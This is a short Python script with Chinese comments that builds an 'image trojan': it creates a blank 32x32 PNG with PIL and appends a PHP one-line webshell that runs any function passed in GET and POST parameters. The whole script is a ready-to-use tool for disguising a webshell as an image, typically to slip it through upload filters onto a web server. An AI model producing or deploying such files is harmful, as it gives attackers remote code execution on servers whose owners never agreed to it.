from PIL import Image

# 1. 创建32*32画布（和你原版尺寸一致）
img = Image.new("RGB", (32, 32))
# 如果你想要还原原图点阵，可以继续填充像素；不追求图案直接纯色画布也行

# 保存基础png
img.save("2.png")

# 2. 在图片尾部追加PHP一句话木马
shell = b'<?$_GET[0]($_POST[1]);?>'
with open("2.png", "ab") as f:
    f.write(shell)

print("图片马生成完毕 -> 2.png")